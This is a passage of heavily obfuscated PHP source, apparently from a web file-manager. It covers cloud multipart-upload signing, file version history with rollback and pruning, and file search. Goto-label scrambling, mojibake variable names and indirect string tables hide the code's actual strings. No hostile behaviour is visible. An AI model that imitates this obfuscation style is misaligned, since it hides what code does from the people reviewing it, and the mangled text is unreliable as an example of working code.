$bŒ„‘‘¯ï° = gmdate($C¤ÇºŠˆÎí[1103]); $EöÆš’Ç‡ = gmdate($C¤ÇºŠˆÎí[687]); goto aÑ‚ÀˆåŞ; DõèÓï›âÎ: $e…˜Ë¬› = hash_hmac($C¤ÇºŠˆÎí[1112], $eÂ†àÆëãõ, $BùóÃ¬¡ˆ², !0); $Bó›·í™÷Ë = hash_hmac($C¤ÇºŠˆÎí[1112], $d»Ä¬å„, $e…˜Ë¬›, !0); $DğÏéöùÖ = hash_hmac($C¤ÇºŠˆÎí[1112], $B• ‚ª¼º, $Bó›·í™÷Ë); goto b°Öå÷ÚË; AÙ†§’—³: $C¤ÇºŠˆÎí =& $_SERVER[¿õñ]; $fìÏ„ä¸¯¯ = $C¤ÇºŠˆÎí[182]; $f‹­Ç‰¸ÑŠ = $C¤ÇºŠˆÎí[1102]; goto FÎ‚«‡œ­; b¸£ŠŒ¯ÍÔ: } public function multiUploadFormData($FËŒæÊÆÊ, $EÓ×àÂãŒ = 3600) { $A˜‰ºõÇÒ„ =& $_SERVER[¿õñ]; $eˆ©„ˆé÷ƒ = gmdate($A˜‰ºõÇÒ„[1199]); $aîÅØê˜óñ = array(); $A›è‹µ‚‚Í = $this->client->getUploadId($this->bucket, $FËŒæÊÆÊ, $aîÅØê˜óñ); if (!$A›è‹µ‚‚Í) { return !1; } return array($A˜‰ºõÇÒ„[206] => $A›è‹µ‚‚Í, $A˜‰ºõÇÒ„[166] => $this->getHost() . $A˜‰ºõÇÒ„[8] . $this->pathEncode($FËŒæÊÆÊ), $A˜‰ºõÇÒ„[207] => $eˆ©„ˆé÷ƒ, $A˜‰ºõÇÒ„[88] => $FËŒæÊÆÊ); } public function multiUploadAuthData($e¥Ú¤¡·, $A»¾‚èÓ‚ = array()) { goto e¢İå›áŸµ; fÏİ©•¾šÏ: if (isset($A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[1200]])) { $fÂÅØÃ„ª[$Cë¤ Ä·ğ‘[1201]] = $A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[1200]]; } $E²³àÛøÉŞ = explode($Cë¤ Ä·ğ‘[168], $this->getHost()); $Eˆçİ”’§¯ = array($Cë¤ Ä·ğ‘[1202] => $E²³àÛøÉŞ[1], $Cë¤ Ä·ğ‘[1203] => $Cë¤ Ä·ğ‘[33], $Cë¤ Ä·ğ‘[196] => $Cë¤ Ä·ğ‘[115], $Cë¤ Ä·ğ‘[1114] => $A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[78]]); goto B¬âà¯ƒ; e¢İå›áŸµ: $Cë¤ Ä·ğ‘ =& $_SERVER[¿õñ]; $dòâè„“Å = isset($A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[157]]) ? $A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[157]] : $Cë¤ Ä·ğ‘[33]; $bŸšµØğ…á = $A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[88]]; goto f÷ÖƒŒ£„ß; f÷ÖƒŒ£„ß: unset($A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[88]]); if (isset($A»¾‚èÓ‚[$Cë¤ Ä·ğ‘[208]])) { return $this->listUploadParts($bŸšµØğ…á, $A»¾‚èÓ‚); } $fÂÅØÃ„ª = array(); goto fÏİ©•¾šÏ; d‰Ãç³·: if (strpos($dòâè„“Å, $Cë¤ Ä·ğ‘[210]) === 0) { if (isset($fÂÅØÃ„ª[$Cë¤ Ä·ğ‘[1201]])) { $cÙ¹ÅÃËò = $fÂÅØÃ„ª[$Cë¤ Ä·ğ‘[1201]]; } else { if (isset($cÉô†ÎßÒ—[$Cë¤ Ä·ğ‘[1201]])) { $cÙ¹ÅÃËò = $cÉô†ÎßÒ—[$Cë¤ Ä·ğ‘[1201]]; } else { $cÙ¹ÅÃËò = hash($Cë¤ Ä·ğ‘[1112], $Cë¤ Ä·ğ‘[33]); } } return array($Cë¤ Ä·ğ‘[217] => $cÉô†ÎßÒ—[$Cë¤ Ä·ğ‘[217]], $Cë¤ Ä·ğ‘[1201] => $cÙ¹ÅÃËò, $Cë¤ Ä·ğ‘[207] => $cÉô†ÎßÒ—[$Cë¤ Ä·ğ‘[1204]]); } return $cÉô†ÎßÒ—[$Cë¤ Ä·ğ‘[217]]; goto b£µ±•ê·Ñ; B¬âà¯ƒ: $fâ„è¦Ãæ = $Cë¤ Ä·ğ‘[211]; $FÌÕğº’Çª = $Cë¤ Ä·ğ‘[8] . $this->pathEncode($bŸšµØğ…á) . $dòâè„“Å; $cÉô†ÎßÒ— = $this->client->__getSignatureV4($fÂÅØÃ„ª, $Eˆçİ”’§¯, $fâ„è¦Ãæ, $FÌÕğº’Çª); goto d‰Ãç³·; b£µ±•ê·Ñ: } public function listUploadParts($C…¡ºç™÷«, $d¼¹Òµ–Ó = array()) { goto aô®Šà”Ë; aô®Šà”Ë: $F¯ªÄš–‹ =& $_SERVER[¿õñ]; $b¥àŒ÷ö± = str_replace($F¯ªÄš–‹[218], $F¯ªÄš–‹[33], $d¼¹Òµ–Ó[$F¯ªÄš–‹[157]]); $cÎë¼¤ë—£ = $this->client->listParts($this->bucket, $C…¡ºç™÷«, $b¥àŒ÷ö±); goto E£ò«½á¥; E£ò«½á¥: if (!$cÎë¼¤ë—£) { return !1; } $bÈÅÌå¶ß = $F¯ªÄš–‹[1205]; foreach ($cÎë¼¤ë—£ as $d„°™‡ÉƒÍ) { $bÈÅÌå¶ß .= $F¯ªÄš–‹[1206] . "\x3c\120\141\x72\x74\116\165\155\142\145\x72\76{$d„°™‡ÉƒÍ[$F¯ªÄš–‹[1157]]}\74\57\x50\141\162\164\x4e\x75\155\142\145\x72\76\xa" . "\74\105\x54\x61\147\x3e{$d„°™‡ÉƒÍ[$F¯ªÄš–‹[1158]]}\74\x2f\105\124\141\147\76\12" . $F¯ªÄš–‹[1207]; } goto fÚòŒ‰Ü×Ì; Bš±Ä¡öîŠ: $cØÉÑÈç¾ = array($F¯ªÄš–‹[1202] => $d¤É…”Ä·š[1], $F¯ªÄš–‹[196] => $F¯ªÄš–‹[115], $F¯ªÄš–‹[1114] => strlen($bÈÅÌå¶ß)); $DÖ£´“‹àŞ = $F¯ªÄš–‹[209]; $b™µ÷‡•ÚÏ = $F¯ªÄš–‹[8] . $this->pathEncode($C…¡ºç™÷«) . $d¼¹Òµ–Ó[$F¯ªÄš–‹[157]]; goto bÓˆ¿ˆ²ô®; fÚòŒ‰Ü×Ì: $bÈÅÌå¶ß .= $F¯ªÄš–‹[1208]; $fÙ—Ğ¥ÏÎ = array(); $d¤É…”Ä·š = explode($F¯ªÄš–‹[168], $this->getHost()); goto Bš±Ä¡öîŠ; bÓˆ¿ˆ²ô®: $A›˜ÙÔøÚŠ = $this->client->__getSignatureV4($fÙ—Ğ¥ÏÎ, $cØÉÑÈç¾, $DÖ£´“‹àŞ, $b™µ÷‡•ÚÏ, $bÈÅÌå¶ß); return array($F¯ªÄš–‹[217] => $A›˜ÙÔøÚŠ[$F¯ªÄš–‹[217]], $F¯ªÄš–‹[207] => $A›˜ÙÔøÚŠ[$F¯ªÄš–‹[1204]], $F¯ªÄš–‹[219] => $cÎë¼¤ë—£, $F¯ªÄš–‹[1201] => $A›˜ÙÔøÚŠ[$F¯ªÄš–‹[1201]]); goto Bæ½¿Â§Ì—; Bæ½¿Â§Ì—: } public function link($D‡¹š˜˜Åî, $bâ¨İôìŒ¾ = array()) { return parent::link($D‡¹š˜˜Åî, $bâ¨İôìŒ¾); } public function fileOut($CßÀÏËª», $aÁ©®Úğåà = false, $B‰¾»ÕÍ‘ì = false, $d¡¹¶»½¿ = '') { if (strstr($this->endpoint, $_SERVER[¿õñ][1209])) { return parent::fileOutServer($CßÀÏËª», $aÁ©®Úğåà, $B‰¾»ÕÍ‘ì, $d¡¹¶»½¿); } parent::fileOut($CßÀÏËª», $aÁ©®Úğåà, $B‰¾»ÕÍ‘ì, $d¡¹¶»½¿); } public function fileOutImage($AŞ¢ìÁŸŞ™, $d¬ŠØ³ğ—Û = 250) { if (strstr($this->endpoint, $_SERVER[¿õñ][1209])) { return parent::fileOutImageServer($AŞ¢ìÁŸŞ™, $d¬ŠØ³ğ—Û); } parent::fileOutImage($AŞ¢ìÁŸŞ™, $d¬ŠØ³ğ—Û); } public function getHost() { $fâö‡Ç¢™¬ =& $_SERVER[¿õñ]; $B™ìŠÑ¹Ë = rtrim(parent::getHost(), $fâö‡Ç¢™¬[8] . $this->bucket); $B™ìŠÑ¹Ë = explode($fâö‡Ç¢™¬[168], $B™ìŠÑ¹Ë); return $B™ìŠÑ¹Ë[0] . $fâö‡Ç¢™¬[168] . $this->bucket . $fâö‡Ç¢™¬[92] . $B™ìŠÑ¹Ë[1]; } } goto F’ç³…ìõ; EÑĞ¢¡ğò¡: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\x63\x65\137\150\x69\x73\164\x6f\x72\171"; public function addHistory($aÄƒ„¨É…, $C†¿ßŠÜ­ß = '') { $eŠˆÒ™’–ò =& $_SERVER[¿õñ]; $BÊÔ…ó°» = array($eŠˆÒ™’–ò[380] => $aÄƒ„¨É…[$eŠˆÒ™’–ò[366]], $eŠˆÒ™’–ò[1341] => isset($aÄƒ„¨É…[$eŠˆÒ™’–ò[376]]) ? $aÄƒ„¨É…[$eŠˆÒ™’–ò[376]] : $aÄƒ„¨É…[$eŠˆÒ™’–ò[375]], $eŠˆÒ™’–ò[416] => $aÄƒ„¨É…[$eŠˆÒ™’–ò[415]], $eŠˆÒ™’–ò[513] => $aÄƒ„¨É…[$eŠˆÒ™’–ò[78]], $eŠˆÒ™’–ò[2198] => $C†¿ßŠÜ­ß); $A¢—ÚêæÁÒ = $GLOBALS[$eŠˆÒ™’–ò[6]][$eŠˆÒ™’–ò[84]][$eŠˆÒ™’–ò[2199]]; if ($A¢—ÚêæÁÒ > 1) { $this->historyAutoClear($BÊÔ…ó°»[$eŠˆÒ™’–ò[366]]); $this->add($BÊÔ…ó°»); } Model($eŠˆÒ™’–ò[2200])->eventFileEdit($aÄƒ„¨É…[$eŠˆÒ™’–ò[366]]); } private function historyAutoClear($Eï¡†ùÜè) { goto aÙŸçÉ•Åğ; aÙŸçÉ•Åğ: $DÄÃ×¢ñí­ =& $_SERVER[¿õñ]; $aëì£Ÿæ’ = Model($DÄÃ×¢ñí­[1067])->get($DÄÃ×¢ñí­[2201]); $A÷ƒ¤“”ì = $GLOBALS[$DÄÃ×¢ñí­[6]][$DÄÃ×¢ñí­[84]][$DÄÃ×¢ñí­[2199]]; goto Déƒê‡ë„§; dÒç—Ì¿äÊ: if (!$b§·Š« || $aÓµÍ¿¬™½ >= count($b§·Š«)) { return; } $bé–¶šÆºö = array_to_keyvalue($b§·Š«, $DÄÃ×¢ñí­[33], $DÄÃ×¢ñí­[364]); $bé–¶šÆºö = array_slice($bé–¶šÆºö, $aÓµÍ¿¬™½); goto aÂÚ©½¿ƒ ; f´ƒñºó»: $cÏÌªƒòŒœ = array($DÄÃ×¢ñí­[382] => array($DÄÃ×¢ñí­[7], $bé–¶šÆºö)); $this->where($cÏÌªƒòŒœ)->delete(); Model($DÄÃ×¢ñí­[418])->remove($EÆ ù¢œÜ); goto FÏ‹‘÷Ú»; aÂÚ©½¿ƒ : $EÆ ù¢œÜ = array_to_keyvalue($b§·Š«, $DÄÃ×¢ñí­[33], $DÄÃ×¢ñí­[415]); $EÆ ù¢œÜ = array_slice($EÆ ù¢œÜ, $aÓµÍ¿¬™½); if (!$bé–¶šÆºö || !$EÆ ù¢œÜ) { return; } goto f´ƒñºó»; Déƒê‡ë„§: $b¦ïÜã ÷ = $aëì£Ÿæ’ == $DÄÃ×¢ñí­[2202] ? 3 : $A÷ƒ¤“”ì; if ($A÷ƒ¤“”ì <= 1) { $b¦ïÜã ÷ = 1; } $aÓµÍ¿¬™½ = $b¦ïÜã ÷ - 1; goto b™Ó–Ÿ¤; b™Ó–Ÿ¤: if ($aÓµÍ¿¬™½ >= 500) { return; } $cÏÌªƒòŒœ = array($DÄÃ×¢ñí­[380] => $Eï¡†ùÜè); $b§·Š« = $this->field($DÄÃ×¢ñí­[2203])->where($cÏÌªƒòŒœ)->order($DÄÃ×¢ñí­[2195])->select(); goto dÒç—Ì¿äÊ; FÏ‹‘÷Ú»: } public function listData($bÇ¢Ò„ÅÚ˜) { goto eæ‰‹øßºÍ; e»ÆÓ«ø½§: $dÆ”ÔùÄî = $this->field($A×›–Êø“Ô)->where($bõôÀÄ¡Á)->order($dÅÈ•óÏ¨[2195])->selectPage(); $this->_listAppendUser($dÆ”ÔùÄî[$dÅÈ•óÏ¨[350]]); $fºŠÙ‹ˆÅä = Model($dÅÈ•óÏ¨[1067])->get($dÅÈ•óÏ¨[2201]); goto Fè­ååãÂÌ; eæ‰‹øßºÍ: $dÅÈ•óÏ¨ =& $_SERVER[¿õñ]; $bõôÀÄ¡Á = array($dÅÈ•óÏ¨[380] => $bÇ¢Ò„ÅÚ˜); $A×›–Êø“Ô = $dÅÈ•óÏ¨[2204]; goto e»ÆÓ«ø½§; Fè­ååãÂÌ: $bòÂì¢ğ¡³ = 3; if ($fºŠÙ‹ˆÅä == $dÅÈ•óÏ¨[2202]) { $dÆ”ÔùÄî[$dÅÈ•óÏ¨[350]] = array_slice($dÆ”ÔùÄî[$dÅÈ•óÏ¨[350]], 0, $bòÂì¢ğ¡³); $dÆ”ÔùÄî[$dÅÈ•óÏ¨[347]] = array($dÅÈ•óÏ¨[2205] => 1, $dÅÈ•óÏ¨[2206] => 20, $dÅÈ•óÏ¨[2207] => 1, $dÅÈ•óÏ¨[2208] => count($dÆ”ÔùÄî[$dÅÈ•óÏ¨[350]])); } return $dÆ”ÔùÄî; goto cà‹¡•„; cà‹¡•„: } protected function _listAppendUser(&$c´±Ó¬ƒ¼ª) { $FÚ™•ÄÖƒŒ =& $_SERVER[¿õñ]; $b±ö©Ûİ¡¾ = array_to_keyvalue($c´±Ó¬ƒ¼ª, $FÚ™•ÄÖƒŒ[33], $FÚ™•ÄÖƒŒ[1350]); $bÔ÷ÍŠ¤òÊ = Model($FÚ™•ÄÖƒŒ[469])->userListInfo($b±ö©Ûİ¡¾); foreach ($c´±Ó¬ƒ¼ª as &$a½ÏÍ•¯›‘) { $Eá¹šÖÒÑ = $a½ÏÍ•¯›‘[$FÚ™•ÄÖƒŒ[1350]]; $a½ÏÍ•¯›‘[$FÚ™•ÄÖƒŒ[375]] = $bÔ÷ÍŠ¤òÊ[$Eá¹šÖÒÑ] ? $bÔ÷ÍŠ¤òÊ[$Eá¹šÖÒÑ] : !1; } } public function fileInfo($bà¢ÕÂÊ‘) { $cÅØÖß“ˆ¾ =& $_SERVER[¿õñ]; $DÓ·ÉŒÔÏÎ = $this->tablePrefix; $f‰Ù–øëÏ = "{$DÓ·ÉŒÔÏÎ}\151\157\x5f\146\x69\x6c\145\40\x66\151\154\x65\163\x20\x6f\x6e\x20\x66\x69\154\x65\163\x2e\x66\x69\x6c\145\x49\104\40\x3d\40\150\x69\163\x74\x6f\162\171\56\x66\x69\154\x65\x49\x44"; return $this->alias($cÅØÖß“ˆ¾[2209])->where(array($cÅØÖß“ˆ¾[382] => $bà¢ÕÂÊ‘))->join($f‰Ù–øëÏ, $cÅØÖß“ˆ¾[2210])->find(); } public function removeItem($Cå¶¿Ö“) { $BÓõÈùŒïŞ =& $_SERVER[¿õñ]; $A²èòµó = array($BÓõÈùŒïŞ[382] => $Cå¶¿Ö“); $aÍôˆ•¯ = $this->where($A²èòµó)->find(); if ($aÍôˆ•¯) { $E…²ß¼Ãñ = $this->where($A²èòµó)->delete(); Model($BÓõÈùŒïŞ[418])->remove($aÍôˆ•¯[$BÓõÈùŒïŞ[415]]); return $E…²ß¼Ãñ; } return !1; } public function removeBySource($Få‡ñ¬¦‘Ñ) { goto eáÒ§‘Ã¦; eáÒ§‘Ã¦: $fŠ‚ÏÔ§Œ =& $_SERVER[¿õñ]; if (!$Få‡ñ¬¦‘Ñ) { return !1; } if (!is_array($Få‡ñ¬¦‘Ñ)) { $Få‡ñ¬¦‘Ñ = array($Få‡ñ¬¦‘Ñ); } goto BšõÚÎò‚Æ; C”ï¬õÒÆø: return !0; goto cÕÁà£Ë•ó; BšõÚÎò‚Æ: $Aß’Ã‘Ö¦ = array($fŠ‚ÏÔ§Œ[380] => array($fŠ‚ÏÔ§Œ[7], $Få‡ñ¬¦‘Ñ)); $dÆ¶œŠ†Ø = $this->field($fŠ‚ÏÔ§Œ[416])->where($Aß’Ã‘Ö¦)->select(); if ($dÆ¶œŠ†Ø) { $this->where($Aß’Ã‘Ö¦)->delete(); $Bõİ®ÈÃ— = array_to_keyvalue($dÆ¶œŠ†Ø, $fŠ‚ÏÔ§Œ[33], $fŠ‚ÏÔ§Œ[415]); Model($fŠ‚ÏÔ§Œ[418])->remove($Bõİ®ÈÃ—); } goto C”ï¬õÒÆø; cÕÁà£Ë•ó: } public function setDetail($D»’à‰ñŸ, $D»‹Ë¨ò÷ ) { $E†ï™¦ç„å =& $_SERVER[¿õñ]; return $this->where(array($E†ï™¦ç„å[382] => $D»’à‰ñŸ))->save(array($E†ï™¦ç„å[2198] => $D»‹Ë¨ò÷ )); } public function rollbackToItem($AéÉÔµ“í, $B¬æµñµ¦÷) { goto d¹Ü»ĞÀ; dËô¯äå‹‹: $c¹­£ç¨Ò = $this->find($B¬æµñµ¦÷); $CĞºÒé£ª = array($cŠë±¸î¦‡[415] => $c¹­£ç¨Ò[$cŠë±¸î¦‡[415]], $cŠë±¸î¦‡[78] => $c¹­£ç¨Ò[$cŠë±¸î¦‡[78]], $cŠë±¸î¦‡[106] => time(), $cŠë±¸î¦‡[376] => USER_ID); Model($cŠë±¸î¦‡[759])->where(array($cŠë±¸î¦‡[366] => $AéÉÔµ“í))->save($CĞºÒé£ª); goto d±Â·›¡Ü‰; d¹Ü»ĞÀ: $cŠë±¸î¦‡ =& $_SERVER[¿õñ]; $Fœ–­óã…¢ = Model($cŠë±¸î¦‡[759])->sourceInfo($AéÉÔµ“í); $this->addHistory($Fœ–­óã…¢); goto dËô¯äå‹‹; d±Â·›¡Ü‰: return $this->where(array($cŠë±¸î¦‡[382] => $B¬æµñµ¦÷))->delete(); goto F”‡ïïõ¶Ñ; F”‡ïïõ¶Ñ: } public function clearSame($F®ø¦—ÇÌ) { goto dõÇ¯‰¬î†; Dé¾‰…¥»¥: $bÍ„¾¤ÁÊ = array(); $E‘Ê¶‡‹²ï = array(); foreach ($C¼—´»·ªñ as $c¯•‹ºŠ­) { if (count($c¯•‹ºŠ­) <= 1) { continue; } foreach ($c¯•‹ºŠ­ as $DåƒˆÑğ”à) { $bÍ„¾¤ÁÊ[] = $DåƒˆÑğ”à[$C©×”ß‡ô¦[415]]; $E‘Ê¶‡‹²ï[] = $DåƒˆÑğ”à[$C©×”ß‡ô¦[364]]; } } goto a»É‘‘áë˜; a»É‘‘áë˜: if (!$E‘Ê¶‡‹²ï) { return; } $this->where(array($C©×”ß‡ô¦[364] => array($C©×”ß‡ô¦[7], $E‘Ê¶‡‹²ï)))->delete(); Model($C©×”ß‡ô¦[418])->remove($bÍ„¾¤ÁÊ); goto B¢ñËÌª»Ü; dõÇ¯‰¬î†: $C©×”ß‡ô¦ =& $_SERVER[¿õñ]; $eÅ‘’ÑÌ©Œ = $this->listData($F®ø¦—ÇÌ); $C¼—´»·ªñ = array_to_keyvalue_group($eÅ‘’ÑÌ©Œ, $C©×”ß‡ô¦[415]); goto Dé¾‰…¥»¥; B¢ñËÌª»Ü: } public function userSpace() { $F©ˆÈ—•«Š =& $_SERVER[¿õñ]; $FÅÎå¶—ÊÈ = $this->tablePrefix; $bŠ¯¥ó¿ø = array($F©ˆÈ—•«Š[1341] => USER_ID); $fÖàÉ“†ÀÆ = "{$FÅÎå¶—ÊÈ}\x69\x6f\x5f\146\x69\x6c\x65\x20\x66\x69\154\145\163\x20\157\x6e\x20\x66\x69\154\145\163\56\146\151\x6c\145\111\x44\40\x3d\x20\150\x69\x73\164\x6f\x72\171\x2e\x66\x69\x6c\145\111\x44"; return $this->alias($F©ˆÈ—•«Š[2209])->where($bŠ¯¥ó¿ø)->join($fÖàÉ“†ÀÆ, $F©ˆÈ—•«Š[2210])->sum($F©ˆÈ—•«Š[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($BÍÅ¤ ¿Ûö) { goto f§¬…ëØÂÄ; f•‡Šƒ¤: if (!$a¾ºãÌç‚ì[$cÍÁ»…„ˆÖ[157]]) { $CÌ¯òŞ×Ôà = array_to_keyvalue($bòÈäø”„, $cÍÁ»…„ˆÖ[33], $cÍÁ»…„ˆÖ[157]); $c¹ó´ç½”” = implode($cÍÁ»…„ˆÖ[47], $CÌ¯òŞ×Ôà); $Cä†½Í¨Œ = $cÍÁ»…„ˆÖ[2167]; } $b¨ï¡‰± = explode($cÍÁ»…„ˆÖ[47], trim($c¹ó´ç½””, $cÍÁ»…„ˆÖ[47])); return array($Cä†½Í¨Œ, $b¨ï¡‰±); goto Døé×¿–íÀ; f§¬…ëØÂÄ: $cÍÁ»…„ˆÖ =& $_SERVER[¿õñ]; $bòÈäø”„ = KodIO::fileTypeList(); $a¾ºãÌç‚ì = $bòÈäø”„[$BÍÅ¤ ¿Ûö]; goto E¬á’¨“‘„; E¬á’¨“‘„: if (!$a¾ºãÌç‚ì) { return array(); } $c¹ó´ç½”” = $a¾ºãÌç‚ì[$cÍÁ»…„ˆÖ[157]]; $Cä†½Í¨Œ = $cÍÁ»…„ˆÖ[7]; goto f•‡Šƒ¤; Døé×¿–íÀ: } public function listPathType($a¨ºÎ­½½­) { $D”¿“µœ‰å =& $_SERVER[¿õñ]; $C™ÈÔäŠœ­ = $this->fileTypeWhere($a¨ºÎ­½½­); if (!$C™ÈÔäŠœ­) { return array(); } $B©–ŞÏî = array($D”¿“µœ‰å[514] => SourceModel::TYPE_USER, $D”¿“µœ‰å[515] => USER_ID, $D”¿“µœ‰å[511] => 0, $D”¿“µœ‰å[512] => $C™ÈÔäŠœ­); return $this->listSource($B©–ŞÏî); } public function listSearch($C»ÄŠº¨, $b‡Ù•º•Í = 300) { goto A½ªø¥Ùœ; A½ªø¥Ùœ: $b­ÃÇİ‡®‰ =& $_SERVER[¿õñ]; if (isset($C»ÄŠº¨[$b­ÃÇİ‡®‰[2092]]) && $C»ÄŠº¨[$b­ÃÇİ‡®‰[2092]]) { $C»ÄŠº¨[$b­ÃÇİ‡®‰[2092]] = str_replace($b­ÃÇİ‡®‰[1501], $b­ÃÇİ‡®‰[2211], trim($C»ÄŠº¨[$b­ÃÇİ‡®‰[2092]])); } $F†²îœ÷åê = $this->_parseSearchWhere($C»ÄŠº¨); goto Cäá²·×ô·; EÍÄÎ †: $this->_listSearchBindPinyin($C»ÄŠº¨, $F†²îœ÷åê, $BÀ®ËÌ†˜ä); $this->alias($b­ÃÇİ‡®‰[479])->_makeOrder()->cache(null, 10); $cŠîõœŠ = $this->distinct(!0)->field($BÀ®ËÌ†˜ä)->where($F†²îœ÷åê)->selectPage($b‡Ù•º•Í); goto d¶œª·œˆ‚; Cäá²·×ô·: if (!isset($F†²îœ÷åê[$b­ÃÇİ‡®‰[393]])) { $F†²îœ÷åê[$b­ÃÇİ‡®‰[393]] = 0; } $BÀ®ËÌ†˜ä = $b­ÃÇİ‡®‰[2212]; $Cè¢£‰ºéª = $BÀ®ËÌ†˜ä; goto EÍÄÎ †; d¶œª·œˆ‚: $this->_listSearchDesc($cŠîõœŠ, $C»ÄŠº¨, $Cè¢£‰ºéª); $this->_listSearchTag($cŠîõœŠ, $C»ÄŠº¨, $Cè¢£‰ºéª); $this->_listDataApply($cŠîõœŠ[$b­ÃÇİ‡®‰[350]]); goto dÔ±¡î—Ò; dÔ±¡î—Ò: $this->_listMake($cŠîõœŠ); return $cŠîõœŠ; goto f„±à‘ÈÅ‡; f„±à‘ÈÅ‡: } private function _listSearchTag(&$bè‹äàä„, $a¡‰¦œÎ„, $dÈÆˆ¿‘¬) { goto C¡Ô¿ôãÈï; FÈƒœ½õÛ·: if (!$cùÔŸ…æã) { return; } $Aˆ„ÎÁ´å³ = array($A°æ¯¬Îí¤[390] => array($A°æ¯¬Îí¤[7], $cùÔŸ…æã)); $Dô¸ŠŠÀí¥ = Model($A°æ¯¬Îí¤[2214])->field($A°æ¯¬Îí¤[76])->where($Aˆ„ÎÁ´å³)->select(); goto Aéò¾‰£Ñç; C¡Ô¿ôãÈï: $A°æ¯¬Îí¤ =& $_SERVER[¿õñ]; if (!$a¡‰¦œÎ„[$A°æ¯¬Îí¤[2092]] || $bè‹äàä„[$A°æ¯¬Îí¤[347]][$A°æ¯¬Îí¤[336]] > 1) { return; } $C¥…×Ÿâª = Model($A°æ¯¬Îí¤[2213])->listData(); goto FÖ˜Ò“¼Åƒ; FÖ˜Ò“¼Åƒ: $cùÔŸ…æã = array(); $c°ùĞğ•‰ï = $a¡‰¦œÎ„[$A°æ¯¬Îí¤[2092]]; foreach ($C¥…×Ÿâª as $C¾‚Ü³¯Ì) { $aĞ¨ê¼·ˆí = $C¾‚Ü³¯Ì[$A°æ¯¬Îí¤[28]]; $bøùßÜÛ = str_replace($A°æ¯¬Îí¤[50], $A°æ¯¬Îí¤[33], Pinyin::encode($aĞ¨ê¼·ˆí)); if (stripos($aĞ¨ê¼·ˆí, $c°ùĞğ•‰ï) !== !1 || stripos($bøùßÜÛ, $c°ùĞğ•‰ï) !== !1) { $cùÔŸ…æã[] = $C¾‚Ü³¯Ì[$A°æ¯¬Îí¤[364]]; } } goto FÈƒœ½õÛ·; Aéò¾‰£Ñç: $Dô¸ŠŠÀí¥ = array_to_keyvalue($Dô¸ŠŠÀí¥, $A°æ¯¬Îí¤[33], $A°æ¯¬Îí¤[76]); $f¬×²ŞÈÒ× = array_unique($Dô¸ŠŠÀí¥); $this->_listSearchMerge($bè‹äàä„, $a¡‰¦œÎ„, $dÈÆˆ¿‘¬, $f¬×²ŞÈÒ×); goto fè£àñĞß†; fè£àñĞß†: } private function _listSearchDesc(&$DŸç²¢÷¿, $cä‹Ôµ¹, $a“‰ë•‰®) { goto c÷éø‰ç†ï; C˜…í‘Úåã: $fñ¹ˆ±Ó¸‹ = Model($aà²ß——Ô[497])->field($aà²ß——Ô[366])->where($CÈİ—È³¶Ï)->select(); $C“‰¾ÌêÊ = array_to_keyvalue($fñ¹ˆ±Ó¸‹, $aà²ß——Ô[33], $aà²ß——Ô[366]); $this->_listSearchMerge($DŸç²¢÷¿, $cä‹Ôµ¹, $a“‰ë•‰®, $C“‰¾ÌêÊ); goto E‡ÔìóÊ‘; c÷éø‰ç†ï: $aà²ß——Ô =& $_SERVER[¿õñ]; if (!$cä‹Ôµ¹[$aà²ß——Ô[2092]] || $DŸç²¢÷¿[$aà²ß——Ô[347]][$aà²ß——Ô[336]] > 1) { return; } $AˆÙõºğ§ƒ = $this->listSearchChildren($cä‹Ôµ¹[$aà²ß——Ô[457]]); goto c³àÅÁÚåÓ; c³àÅÁÚåÓ: $AˆÙõºğ§ƒ = array_unique($AˆÙõºğ§ƒ); if (!$AˆÙõºğ§ƒ) { return; } $CÈİ—È³¶Ï = array($aà²ß——Ô[366] => array($aà²ß——Ô[7], $AˆÙõºğ§ƒ), $aà²ß——Ô[88] => $aà²ß——Ô[401], $aà²ß——Ô[354] => array($aà²ß——Ô[758], $aà²ß——Ô[2094] . $cä‹Ôµ¹[$aà²ß——Ô[2092]] . $aà²ß——Ô[2094])); goto C˜…í‘Úåã; E‡ÔìóÊ‘: } private function _listSearchMerge(&$dÄŸÀ‘â, $d…É¥³ÌíÊ, $E»Û¶’’òã, $f’‰òÛù) { goto f†Œ–³ Õ; AÕĞÁ°İ¨ó: $C¨Ó¬Ü· = $this->field($E»Û¶’’òã)->where($C¬ÕŞ×É…)->select(); if (!$C¨Ó¬Ü·) { return; } $bñ¸‡ˆó¿å = array(); goto EÉ®ƒ¦µŠƒ; f†Œ–³ Õ: $a¬åõä–Â =& $_SERVER[¿õñ]; if (!$f’‰òÛù) { return; } $e¹­´Š†ËÏ = array_to_keyvalue($dÄŸÀ‘â[$a¬åõä–Â[350]], $a¬åõä–Â[33], $a¬åõä–Â[366]); goto c°Ûîöµì; EÉ®ƒ¦µŠƒ: foreach ($C¨Ó¬Ü· as $A’“ßÕ–•¢) { $B‚Ï¾Áôğ– = $a¬åõä–Â[47] . $d…É¥³ÌíÊ[$a¬åõä–Â[457]] . $a¬åõä–Â[47]; if (stripos($A’“ßÕ–•¢[$a¬åõä–Â[455]], $B‚Ï¾Áôğ–) !== !1) { $bñ¸‡ˆó¿å[] = $A’“ßÕ–•¢; } } $dÄŸÀ‘â[$a¬åõä–Â[350]] = array_merge($bñ¸‡ˆó¿å, $dÄŸÀ‘â[$a¬åõä–Â[350]]); $dÄŸÀ‘â[$a¬åõä–Â[347]][$a¬åõä–Â[348]] += count($bñ¸‡ˆó¿å); goto e“¥Šñ¥‰¨; c°Ûîöµì: $F·¨‹‡„à„ = array_diff($f’‰òÛù, $e¹­´Š†ËÏ); if (!$F·¨‹‡„à„) { return; } $C¬ÕŞ×É… = array($a¬åõä–Â[366] => array($a¬åõä–Â[7], $F·¨‹‡„à„)); goto AÕĞÁ°İ¨ó; e“¥Šñ¥‰¨: } public function listSearchChildren($eÔÖ»„Ù, $fñá‹áºĞÏ = 5000) { goto F´ôøË§£Ë; F´ôøË§£Ë: $D“­Ä«ßÜ =& $_SERVER[¿õñ]; $dÎä×ÄŒª¿ = array(); $Bíæ‹Äæâ = $this->sourceInfo($eÔÖ»„Ù); goto e×æˆÚºÁ¢; e×æˆÚºÁ¢: 